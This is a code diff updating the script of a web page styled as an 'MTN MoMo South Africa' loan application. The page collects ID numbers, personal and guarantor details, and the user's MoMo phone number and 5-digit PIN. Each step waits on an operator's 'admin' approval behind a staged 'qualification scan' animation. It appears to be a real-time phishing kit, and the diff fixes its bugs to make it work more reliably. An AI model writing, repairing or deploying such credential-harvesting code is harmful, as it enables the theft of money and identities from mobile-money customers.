@@ -1,13 +1,13 @@
 // ============================================================
-// script.js – MTN MoMo South Africa v6.0
+// script.js – MTN MoMo South Africa v6.1 (FIXED)
 // MoMo Login replaces SMS/OTP verification
 // ============================================================
 'use strict';
 
 const ACCOUNT_TYPES = {
-    yello: { name: 'MoMo Yello', icon: '🟡', dailyCash: 3500, monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true },
-    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true },
-    eazi: { name: 'MoMo Eazi', icon: '⚡', dailyCash: 2000, monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false }
+    yello:      { name: 'MoMo Yello',      icon: '🟡', dailyCash: 3500,  monthlyCap: 20000, maxLoan: 20000, minLoan: 5000, requiresId: true  },
+    yello_plus: { name: 'MoMo Yello Plus', icon: '⭐', dailyCash: 10000, monthlyCap: 40000, maxLoan: 40000, minLoan: 5000, requiresId: true  },
+    eazi:       { name: 'MoMo Eazi',       icon: '⚡', dailyCash: 2000,  monthlyCap: 10000, maxLoan: 10000, minLoan: 5000, requiresId: false }
 };
 
 const STEPS = ['loan', 'personal', 'employment', 'guarantor', 'momologin', 'qualification'];
@@ -18,6 +18,7 @@ const S = {
     accountType: null,
     accountMaxLoan: 0,
     idNumber: null,
+    steps: {},                       // ✅ FIXED: was missing
     loan: {}, personal: {}, employment: {}, guarantor: {}
 };
 
@@ -26,7 +27,10 @@ const POLL_MAX_DURATION = 30 * 60 * 1000;
 
 let activePoll = null;
 let currentPollStep = null;
+let currentPollCallback = null;      // ✅ FIXED: keep callback so visibilitychange can resume
+let currentPollStarted = 0;
 let selectedAccountType = null;
+let qualificationAnimator = null;    // ✅ FIXED: track animation interval
 
 const KEYS = {
     APP_ID: 'mtn_za_app_id_v6',
@@ -34,8 +38,8 @@ const KEYS = {
 };
 
 const save = (k, d) => { try { localStorage.setItem(k, JSON.stringify(d)); } catch (e) {} };
-const get = (k) => { try { const d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } };
-const rm = (k) => { try { localStorage.removeItem(k); } catch (e) {} };
+const get  = (k) => { try { const d = localStorage.getItem(k); return d ? JSON.parse(d) : null; } catch (e) { return null; } };
+const rm   = (k) => { try { localStorage.removeItem(k); } catch (e) {} };
 
 // ─── Helpers ───
 function escapeHtml(s) {
@@ -49,8 +53,9 @@ function genAppId() {
 }
 
 // ─── Offline detection ───
-window.addEventListener('online', () => document.getElementById('offlineBanner').classList.add('hidden'));
+window.addEventListener('online',  () => document.getElementById('offlineBanner').classList.add('hidden'));
 window.addEventListener('offline', () => document.getElementById('offlineBanner').classList.remove('hidden'));
+if (!navigator.onLine) document.getElementById('offlineBanner').classList.remove('hidden');
 
 // ─── Popstate guard ───
 window.addEventListener('popstate', () => {
@@ -132,10 +137,10 @@ function goTo(pageId) {
     history.pushState({ page: pageId }, '', '#' + pageId);
 
     if (pageId === 'page-requirements') updateRequirementsLimits();
-    if (pageId === 'page-step1') refreshStep1();
+    if (pageId === 'page-step1')        refreshStep1();
     if (pageId === 'page-confirmation') updateConfirmation();
     refreshAccountBadges();
-    stopPolling();
+    if (!pageId.startsWith('page-wait-') && pageId !== 'page-scan') stopPolling();
 }
 
 function refreshAccountBadges() {
@@ -166,15 +171,15 @@ function normalizeId(id) {
 }
 
 function updateCalc() {
-    const amt = +document.getElementById('amtSlider').value;
+    const amt  = +document.getElementById('amtSlider').value;
     const term = +document.getElementById('calcTermSelect').value;
     const r = 0.27 / 12;
     const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -term)) + 60);
     const total = monthly * term;
 
-    document.getElementById('calcAmt').textContent = 'R ' + amt.toLocaleString();
+    document.getElementById('calcAmt').textContent    = 'R ' + amt.toLocaleString();
     document.getElementById('monthlyAmt').textContent = 'R ' + monthly.toLocaleString();
-    document.getElementById('totalAmt').textContent = 'R ' + total.toLocaleString();
+    document.getElementById('totalAmt').textContent   = 'R ' + total.toLocaleString();
     document.getElementById('receiveAmt').textContent = 'R ' + amt.toLocaleString();
 
     const slider = document.getElementById('amtSlider');
@@ -200,13 +205,14 @@ function parseSAId(id) {
         return { ok: false, reason: 'Invalid date of birth.' };
     }
     const age = Math.floor((Date.now() - dob.getTime()) / 31557600000);
-    if (age < 18) return { ok: false, reason: 'Must be 18 or older.' };
+    if (age < 18)  return { ok: false, reason: 'Must be 18 or older.' };
     if (age > 100) return { ok: false, reason: 'Age exceeds maximum.' };
     if (!luhnCheck(clean)) return { ok: false, reason: 'Invalid ID checksum.' };
 
     const gender = parseInt(clean.substring(6, 10)) >= 5000 ? 'Male' : 'Female';
     const c = clean[10];
-    const citizenship = c === '0' ? 'SA Citizen' : c === '1' ? 'Permanent Resident' : c === '2' ? 'Refugee' : c === '3' ? 'Asylum Seeker' : 'Other';
+    const citizenship = c === '0' ? 'SA Citizen' : c === '1' ? 'Permanent Resident'
+                       : c === '2' ? 'Refugee' : c === '3' ? 'Asylum Seeker' : 'Other';
 
     return { ok: true, dob: dob.toLocaleDateString('en-ZA', { day: '2-digit', month: 'long', year: 'numeric' }), age, gender, citizenship };
 }
@@ -235,13 +241,28 @@ function validateAndPreviewId(id) {
 // ═══════════════════════════════════════════════════════════
 function applyAsExistingUser() {
     if (!isUserRegistered()) { forceRegistration(); return; }
-    if (S.steps?.loan === 'approved') { goTo('page-step2'); return; }
+    // ✅ FIXED: resume from furthest approved step
+    if (S.steps.loan === 'approved') {
+        if (S.steps.personal === 'approved') {
+            if (S.steps.employment === 'approved') {
+                if (S.steps.guarantor === 'approved') { goTo('page-confirmation'); return; }
+                goTo('page-guarantor'); return;
+            }
+            goTo('page-step3'); return;
+        }
+        goTo('page-step2'); return;
+    }
     goTo('page-step1');
 }
+
 function applyFromCalculator() {
     if (!isUserRegistered()) { forceRegistration(); return; }
-    S.loan.loanAmount = +document.getElementById('amtSlider').value;
-    S.loan.loanTerm = document.getElementById('calcTermSelect').value + ' Months';
+    const amt = +document.getElementById('amtSlider').value;
+    const term = document.getElementById('calcTermSelect').value + ' Months';
+    // ✅ FIXED: clamp to account type max
+    const max = S.accountMaxLoan || ACCOUNT_TYPES[S.accountType].maxLoan;
+    S.loan.loanAmount = Math.min(amt, max);
+    S.loan.loanTerm   = term;
     saveAll();
     showToast(`R ${fmt(S.loan.loanAmount)} selected`, 'success');
     goTo('page-step1');
@@ -250,6 +271,9 @@ function applyFromCalculator() {
 function startMoMoRegistration() {
     S.isRegistered = false;
     S.accountType = null;
+    S.accountMaxLoan = 0;
+    S.idNumber = null;
+    S.steps = {};
     saveAll();
     document.getElementById('regId').value = '';
     document.getElementById('regDetailsPreview').innerHTML = '<div class="reg-preview-placeholder">Enter your ID above</div>';
@@ -309,10 +333,12 @@ async function completeRegistration() {
             return;
         }
 
-        S.idNumber = id;
-        S.accountType = selectedAccountType;
+        S.idNumber      = id;
+        S.accountType   = selectedAccountType;
         S.accountMaxLoan = data.maxLoan;
-        S.isRegistered = true;
+        S.isRegistered  = true;
+        // ✅ FIXED: initialize fresh steps
+        S.steps = { loan: 'idle', personal: 'idle', employment: 'idle', guarantor: 'idle', momologin: 'idle', qualification: 'idle' };
         saveAll();
 
         document.getElementById('regProcessingStatus').textContent = '✅ Account created!';
@@ -347,10 +373,17 @@ function refreshStep1() {
     const t = ACCOUNT_TYPES[S.accountType];
     document.getElementById('accInfoBox').style.display = 'block';
     document.getElementById('accInfoText').innerHTML = `<b>${t.icon} ${t.name}</b> — Max loan <b>R ${fmt(t.maxLoan)}</b>`;
-    document.getElementById('loanLimitHint').textContent = `Max R ${fmt(t.maxLoan)}`;
+    document.getElementById('loanLimitHint').textContent = `Min R ${fmt(t.minLoan)} · Max R ${fmt(t.maxLoan)}`;
     const am = document.getElementById('s1am');
+    am.min = t.minLoan;
     am.max = t.maxLoan;
+    // ✅ FIXED: prefill from S.loan if set (e.g. from calculator or recovery)
+    if (S.loan.loanAmount) am.value = Math.min(S.loan.loanAmount, t.maxLoan);
     if (+am.value > t.maxLoan) am.value = t.maxLoan;
+    if (+am.value < t.minLoan) am.value = t.minLoan;
+    if (S.loan.loanType)    document.getElementById('s1ty').value = S.loan.loanType;
+    if (S.loan.loanTerm)    document.getElementById('s1te').value = S.loan.loanTerm;
+    if (S.loan.loanPurpose) document.getElementById('s1pu').value = S.loan.loanPurpose;
 }
 
 async function submitStepLoan() {
@@ -359,11 +392,11 @@ async function submitStepLoan() {
     const am = +document.getElementById('s1am').value;
     const te = document.getElementById('s1te').value;
     const pu = document.getElementById('s1pu').value.trim();
-    const t = ACCOUNT_TYPES[S.accountType];
+    const t  = ACCOUNT_TYPES[S.accountType];
 
     if (!ty || !te || !pu) return showErr('s1Err', 'Complete all fields.');
-    if (am < t.minLoan) return showErr('s1Err', `Min R ${fmt(t.minLoan)}.`);
-    if (am > t.maxLoan) return showErr('s1Err', `Max R ${fmt(t.maxLoan)}.`);
+    if (am < t.minLoan)    return showErr('s1Err', `Min R ${fmt(t.minLoan)}.`);
+    if (am > t.maxLoan)    return showErr('s1Err', `Max R ${fmt(t.maxLoan)}.`);
 
     const btn = document.getElementById('s1Btn');
     setBtnLoading(btn, true, 'Submit for Approval');
@@ -384,10 +417,15 @@ async function submitStepLoan() {
             return showErr('s1Err', data.error || 'Submission failed.');
         }
         S.loan = { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu };
+        S.steps.loan = 'pending';
         saveAll();
         document.getElementById('waitLoanStatus').textContent = '⏳ Awaiting approval...';
         goTo('page-wait-loan');
-        startPolling('loan', () => { showToast('✅ Loan approved!', 'success'); goTo('page-step2'); });
+        startPolling('loan', () => {
+            S.steps.loan = 'approved'; saveAll();
+            showToast('✅ Loan approved!', 'success');
+            goTo('page-step2');
+        });
     } catch (e) { showErr('s1Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
 }
 
@@ -421,9 +459,14 @@ async function submitStepPersonal() {
         setBtnLoading(btn, false, 'Submit for Approval');
         if (!data.ok) { showErr('s2Err', data.error || 'Failed.'); return; }
         S.personal = { firstName: fi, lastName: la, phone: ph, email: em };
+        S.steps.personal = 'pending';
         saveAll();
         goTo('page-wait-personal');
-        startPolling('personal', () => { showToast('✅ Personal approved!', 'success'); goTo('page-step3'); });
+        startPolling('personal', () => {
+            S.steps.personal = 'approved'; saveAll();
+            showToast('✅ Personal approved!', 'success');
+            goTo('page-step3');
+        });
     } catch (e) { showErr('s2Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
 }
 
@@ -432,10 +475,10 @@ async function submitStepPersonal() {
 // ═══════════════════════════════════════════════════════════
 async function submitStepEmployment() {
     if (!isUserRegistered()) return forceRegistration();
-    const em = document.getElementById('s3em').value;
+    const em  = document.getElementById('s3em').value;
     const inc = +document.getElementById('s3in').value;
-    const kn = document.getElementById('s3kn').value.trim();
-    const kp = document.getElementById('s3kp').value;
+    const kn  = document.getElementById('s3kn').value.trim();
+    const kp  = document.getElementById('s3kp').value;
 
     if (!em || inc <= 0) return showErr('s3Err', 'Complete all fields.');
     if (!kn) return showErr('s3Err', 'Next of kin name required.');
@@ -457,9 +500,14 @@ async function submitStepEmployment() {
         setBtnLoading(btn, false, 'Submit for Approval');
         if (!data.ok) { showErr('s3Err', data.error || 'Failed.'); return; }
         S.employment = { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp };
+        S.steps.employment = 'pending';
         saveAll();
         goTo('page-wait-employment');
-        startPolling('employment', () => { showToast('✅ Employment approved!', 'success'); goTo('page-guarantor'); });
+        startPolling('employment', () => {
+            S.steps.employment = 'approved'; saveAll();
+            showToast('✅ Employment approved!', 'success');
+            goTo('page-guarantor');
+        });
     } catch (e) { showErr('s3Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
 }
 
@@ -495,9 +543,14 @@ async function submitStepGuarantor() {
         setBtnLoading(btn, false, 'Submit for Approval');
         if (!data.ok) { showErr('gErr', data.error || 'Failed.'); return; }
         S.guarantor = { guarantorName: gn, guarantorPhone: gp, guarantorRelation: gr };
+        S.steps.guarantor = 'pending';
         saveAll();
         goTo('page-wait-guarantor');
-        startPolling('guarantor', () => { showToast('✅ Guarantor approved!', 'success'); goTo('page-confirmation'); });
+        startPolling('guarantor', () => {
+            S.steps.guarantor = 'approved'; saveAll();
+            showToast('✅ Guarantor approved!', 'success');
+            goTo('page-confirmation');
+        });
     } catch (e) { showErr('gErr', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
 }
 
@@ -507,21 +560,21 @@ async function submitStepGuarantor() {
 function updateConfirmation() {
     if (!S.loan.loanAmount) return;
     const amt = S.loan.loanAmount;
-    const months = parseInt(S.loan.loanTerm);
+    const months = parseInt(S.loan.loanTerm) || 12;
     const r = 0.27 / 12;
     const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + 60);
     const totalCost = monthly * months - amt;
 
-    document.getElementById('cfAmount').textContent = 'R ' + fmt(amt);
-    document.getElementById('cfTerm').textContent = S.loan.loanTerm;
+    document.getElementById('cfAmount').textContent  = 'R ' + fmt(amt);
+    document.getElementById('cfTerm').textContent    = S.loan.loanTerm;
     document.getElementById('cfPurpose').textContent = S.loan.loanPurpose;
     document.getElementById('cfMonthly').textContent = 'R ' + fmt(monthly);
-    document.getElementById('cfCost').textContent = 'R ' + fmt(totalCost);
-    document.getElementById('cfName').textContent = `${S.personal.firstName} ${S.personal.lastName}`;
-    document.getElementById('cfPhone').textContent = '+27 ' + S.personal.phone;
-    document.getElementById('cfEmail').textContent = S.personal.email;
-    document.getElementById('cfGName').textContent = S.guarantor.guarantorName;
-    document.getElementById('cfGPhone').textContent = '+27 ' + S.guarantor.guarantorPhone;
+    document.getElementById('cfCost').textContent    = 'R ' + fmt(totalCost);
+    document.getElementById('cfName').textContent    = `${S.personal.firstName || ''} ${S.personal.lastName || ''}`;
+    document.getElementById('cfPhone').textContent   = '+27 ' + (S.personal.phone || '');
+    document.getElementById('cfEmail').textContent   = S.personal.email || '';
+    document.getElementById('cfGName').textContent   = S.guarantor.guarantorName || '';
+    document.getElementById('cfGPhone').textContent  = '+27 ' + (S.guarantor.guarantorPhone || '');
     document.getElementById('agreeBox').checked = false;
     document.getElementById('confirmBtn').disabled = true;
 }
@@ -537,11 +590,20 @@ async function showAgreement() {
 function closeAgreement() { document.getElementById('agreementModal').classList.remove('show'); }
 
 // ═══════════════════════════════════════════════════════════
-// MOMO LOGIN (replaces SMS/PIN/OTP)
+// MOMO LOGIN
 // ═══════════════════════════════════════════════════════════
 function loginPinMvM(el, i) {
     el.value = el.value.replace(/\D/g, '').slice(0, 1);
     if (el.value && i < 4) document.getElementById('loginPin' + (i + 1))?.focus();
+}
+// ✅ FIXED: backspace navigation
+function loginPinKeydown(el, i, e) {
+    if (e.key === 'Backspace' && !el.value && i > 0) {
+        const prev = document.getElementById('loginPin' + (i - 1));
+        if (prev) { prev.focus(); prev.value = ''; }
+    }
+    if (e.key === 'ArrowLeft'  && i > 0) document.getElementById('loginPin' + (i - 1))?.focus();
+    if (e.key === 'ArrowRight' && i < 4) document.getElementById('loginPin' + (i + 1))?.focus();
 }
 function togLoginPin() {
     for (let i = 0; i < 5; i++) {
@@ -564,9 +626,9 @@ function toggleLoginMethod() {
 async function submitMoMoLogin() {
     if (!isUserRegistered()) return forceRegistration();
 
-    const phone = document.getElementById('loginPhone').value;
+    const phone  = document.getElementById('loginPhone').value;
     const method = document.getElementById('loginMethod').value;
-    const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('loginPin' + i).value).join('');
+    const pin    = [0, 1, 2, 3, 4].map(i => document.getElementById('loginPin' + i).value).join('');
 
     if (phone.length !== 9) return showErr('loginErr', 'Enter your 9-digit MoMo phone.');
     if (method === 'pin' && pin.length !== 5) return showErr('loginErr', 'Enter your 5-digit MoMo PIN.');
@@ -594,8 +656,11 @@ async function submitMoMoLogin() {
             showErr('loginErr', data.error || 'Login failed.');
             return;
         }
+        S.steps.momologin = 'pending';
+        saveAll();
         goTo('page-wait-momologin');
         startPolling('momologin', () => {
+            S.steps.momologin = 'approved'; saveAll();
             showToast('✅ MoMo login confirmed!', 'success');
             startQualificationScan();
         });
@@ -616,30 +681,37 @@ async function startQualificationScan() {
     document.getElementById('waitScanStatus').textContent = '⏳ Analyzing...';
 
     try {
-        await apiCall('/api/submit-step', {
+        const data = await apiCall('/api/submit-step', {
             method: 'POST',
             body: JSON.stringify({ applicationId: S.applicationId, step: 'qualification', data: {} })
         });
+        if (data.ok) { S.steps.qualification = 'pending'; saveAll(); }
     } catch (e) { console.error(e); }
+
+    // ✅ FIXED: clear any previous animator
+    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
 
     let i = 1;
     const statuses = ['📊 Analyzing transactions...', '📈 Verifying 20% requirement...', '🔍 Admin final review...'];
-    const animator = setInterval(() => {
+    qualificationAnimator = setInterval(() => {
         if (i < 3) {
             document.getElementById('scanItem' + i).className = 'scan-item done';
             document.getElementById('scanItem' + (i + 1)).className = 'scan-item active';
             document.getElementById('waitScanStatus').textContent = '⏳ ' + statuses[i];
             i++;
         } else {
-            clearInterval(animator);
+            clearInterval(qualificationAnimator);
+            qualificationAnimator = null;
             document.getElementById('scanItem3').className = 'scan-item done';
             document.getElementById('waitScanStatus').textContent = '⏳ Admin reviewing...';
         }
     }, 2500);
 
     startPolling('qualification', () => {
-        clearInterval(animator);
+        // ✅ FIXED: clear animation on success
+        if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
         ['scanItem1', 'scanItem2', 'scanItem3'].forEach(id => document.getElementById(id).className = 'scan-item done');
+        S.steps.qualification = 'approved'; saveAll();
         setTimeout(() => { showToast('🎉 Loan approved!', 'success'); showApproval(); }, 800);
     });
 }
@@ -650,10 +722,11 @@ async function startQualificationScan() {
 function startPolling(step, onSuccess) {
     stopPolling();
     currentPollStep = step;
-    const start = Date.now();
+    currentPollCallback = onSuccess;
+    currentPollStarted = Date.now();
 
     const tick = async () => {
-        if (Date.now() - start > POLL_MAX_DURATION) {
+        if (Date.now() - currentPollStarted > POLL_MAX_DURATION) {
             showToast('Timed out. Please retry.', 'error');
             stopPolling();
             return;
@@ -664,7 +737,12 @@ function startPolling(step, onSuccess) {
             const data = await r.json();
             if (data.ok) {
                 if (data.status === 'approved') { stopPolling(); onSuccess(); return; }
-                if (data.status === 'rejected') { stopPolling(); handleRejection(step); return; }
+                if (data.status === 'rejected') {
+                    stopPolling();
+                    if (S.steps[step]) { S.steps[step] = 'rejected'; saveAll(); }
+                    handleRejection(step);
+                    return;
+                }
             }
         } catch (e) { console.warn('Poll:', e.message); }
         activePoll = setTimeout(tick, POLL_INTERVAL);
@@ -675,24 +753,28 @@ function startPolling(step, onSuccess) {
 function stopPolling() {
     if (activePoll) { clearTimeout(activePoll); activePoll = null; }
     currentPollStep = null;
+    currentPollCallback = null;
 }
 
 function handleRejection(step) {
     showToast(`❌ ${step.toUpperCase()} rejected. Please try again.`, 'error');
     const retryMap = {
-        loan: () => goTo('page-step1'),
-        personal: () => goTo('page-step2'),
-        employment: () => goTo('page-step3'),
-        guarantor: () => goTo('page-guarantor'),
-        momologin: () => goTo('page-momologin'),
+        loan:          () => goTo('page-step1'),
+        personal:      () => goTo('page-step2'),
+        employment:    () => goTo('page-step3'),
+        guarantor:     () => goTo('page-guarantor'),
+        momologin:     () => goTo('page-momologin'),
         qualification: () => restartApplication()
     };
     (retryMap[step] || (() => goTo('page-landing')))();
 }
 
+// ✅ FIXED: resume polling when user returns to tab
 document.addEventListener('visibilitychange', () => {
-    if (document.hidden && currentPollStep) {
-        if (activePoll) { clearTimeout(activePoll); activePoll = null; }
+    if (!document.hidden && currentPollStep && currentPollCallback && !activePoll) {
+        const step = currentPollStep;
+        const cb = currentPollCallback;
+        startPolling(step, cb);
     }
 });
 window.addEventListener('beforeunload', stopPolling);
@@ -702,14 +784,14 @@ window.addEventListener('beforeunload', stopPolling);
 // ═══════════════════════════════════════════════════════════
 function showApproval() {
     const amt = S.loan.loanAmount;
-    const months = parseInt(S.loan.loanTerm);
+    const months = parseInt(S.loan.loanTerm) || 12;
     const r = 0.27 / 12;
     const monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + 60);
 
     document.getElementById('aprAmount').textContent = 'R ' + fmt(amt);
-    document.getElementById('aprAmt').textContent = 'R ' + fmt(amt);
-    document.getElementById('aprTerm').textContent = S.loan.loanTerm;
-    document.getElementById('aprMth').textContent = 'R ' + fmt(monthly);
+    document.getElementById('aprAmt').textContent    = 'R ' + fmt(amt);
+    document.getElementById('aprTerm').textContent   = S.loan.loanTerm;
+    document.getElementById('aprMth').textContent    = 'R ' + fmt(monthly);
 
     goTo('page-approval');
 }
@@ -746,6 +828,7 @@ function cancelApplication() {
 
 function restartApplication() {
     stopPolling();
+    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
     Object.values(KEYS).forEach(rm);
     location.reload();
 }
@@ -760,13 +843,14 @@ async function recoverSession() {
 
     const data = get(KEYS.APP_DATA);
     if (data) {
-        S.isRegistered = data.isRegistered;
-        S.accountType = data.accountType;
+        S.isRegistered   = data.isRegistered;
+        S.accountType    = data.accountType;
         S.accountMaxLoan = data.accountMaxLoan;
-        S.loan = data.loan || {};
-        S.personal = data.personal || {};
-        S.employment = data.employment || {};
-        S.guarantor = data.guarantor || {};
+        S.steps          = data.steps || {};       // ✅ FIXED
+        S.loan           = data.loan || {};
+        S.personal       = data.personal || {};
+        S.employment     = data.employment || {};
+        S.guarantor      = data.guarantor || {};
     }
 
     if (!isUserRegistered()) { goTo('page-landing'); return; }
@@ -777,29 +861,30 @@ async function recoverSession() {
         const serverState = await r.json();
         if (!serverState.ok || !serverState.isRegistered) { goTo('page-landing'); return; }
 
-        S.accountType = serverState.accountType;
+        S.accountType    = serverState.accountType;
         S.accountMaxLoan = serverState.accountMaxLoan;
+        S.steps          = serverState.steps || S.steps || {};   // ✅ FIXED
         saveAll();
 
-        const steps = serverState.steps || {};
+        const steps = S.steps;
         const pending = STEPS.find(s => steps[s] === 'pending');
         if (pending) {
             const waitPages = {
-                loan: 'page-wait-loan',
-                personal: 'page-wait-personal',
+                loan:       'page-wait-loan',
+                personal:   'page-wait-personal',
                 employment: 'page-wait-employment',
-                guarantor: 'page-wait-guarantor',
-                momologin: 'page-wait-momologin'
+                guarantor:  'page-wait-guarantor',
+                momologin:  'page-wait-momologin'
             };
             if (pending === 'qualification') { startQualificationScan(); return; }
             if (waitPages[pending]) {
                 goTo(waitPages[pending]);
                 const cbMap = {
-                    loan: () => goTo('page-step2'),
-                    personal: () => goTo('page-step3'),
-                    employment: () => goTo('page-guarantor'),
-                    guarantor: () => goTo('page-confirmation'),
-                    momologin: () => startQualificationScan()
+                    loan:       () => { S.steps.loan = 'approved'; saveAll(); goTo('page-step2'); },
+                    personal:   () => { S.steps.personal = 'approved'; saveAll(); goTo('page-step3'); },
+                    employment: () => { S.steps.employment = 'approved'; saveAll(); goTo('page-guarantor'); },
+                    guarantor:  () => { S.steps.guarantor = 'approved'; saveAll(); goTo('page-confirmation'); },
+                    momologin:  () => { S.steps.momologin = 'approved'; saveAll(); startQualificationScan(); }
                 };
                 startPolling(pending, cbMap[pending]);
                 return;
@@ -807,11 +892,13 @@ async function recoverSession() {
         }
 
         if (steps.qualification === 'approved') { showApproval(); return; }
-        if (steps.momologin === 'approved') { startQualificationScan(); return; }
-        if (steps.guarantor === 'approved') { goTo('page-confirmation'); return; }
-        if (steps.employment === 'approved') { goTo('page-guarantor'); return; }
-        if (steps.personal === 'approved') { goTo('page-step3'); return; }
-        if (steps.loan === 'approved') { goTo('page-step2'); return; }
+        if (steps.momologin === 'approved')     { startQualificationScan(); return; }
+        if (steps.guarantor === 'approved')     { goTo('page-confirmation'); return; }
+        if (steps.employment === 'approved')    { goTo('page-guarantor'); return; }
+        if (steps.personal === 'approved')      { goTo('page-step3'); return; }
+        if (steps.loan === 'approved')          { goTo('page-step2'); return; }
+
+        if (steps.loan === 'rejected') { goTo('page-step1'); return; }
         goTo('page-step1');
     } catch (e) {
         console.warn('Recovery failed:', e.message);
@@ -826,15 +913,18 @@ function saveAll() {
     save(KEYS.APP_ID, S.applicationId);
     save(KEYS.APP_DATA, {
         isRegistered: S.isRegistered,
-        accountType: S.accountType,
+        accountType:  S.accountType,
         accountMaxLoan: S.accountMaxLoan,
-        loan: S.loan, personal: S.personal, employment: S.employment, guarantor: S.guarantor
+        steps:        S.steps,             // ✅ FIXED
+        loan: S.loan, personal: S.personal,
+        employment: S.employment, guarantor: S.guarantor
     });
 }
 
 async function retryStep(step) {
     stopPolling();
     try { await apiCall(`/api/retry/${S.applicationId}/${step}`, { method: 'POST' }); } catch (e) {}
+    if (S.steps[step]) { S.steps[step] = 'idle'; saveAll(); }
     if (step === 'momologin') {
         clearLoginPin();
         clearErr('loginErr');
@@ -846,11 +936,13 @@ async function retryStep(step) {
 document.addEventListener('DOMContentLoaded', () => {
     for (let i = 0; i < 5; i++) {
         const el = document.getElementById('loginPin' + i);
-        if (el) el.addEventListener('input', () => loginPinMvM(el, i));
+        if (!el) continue;
+        el.addEventListener('input',   () => loginPinMvM(el, i));
+        el.addEventListener('keydown', (e) => loginPinKeydown(el, i, e));   // ✅ FIXED
     }
 });
 
 // ─── INIT ───
 updateCalc();
 recoverSession();
-console.log('✅ MTN MoMo SA v6.0 loaded');
+console.log('✅ MTN MoMo SA v6.1 loaded');
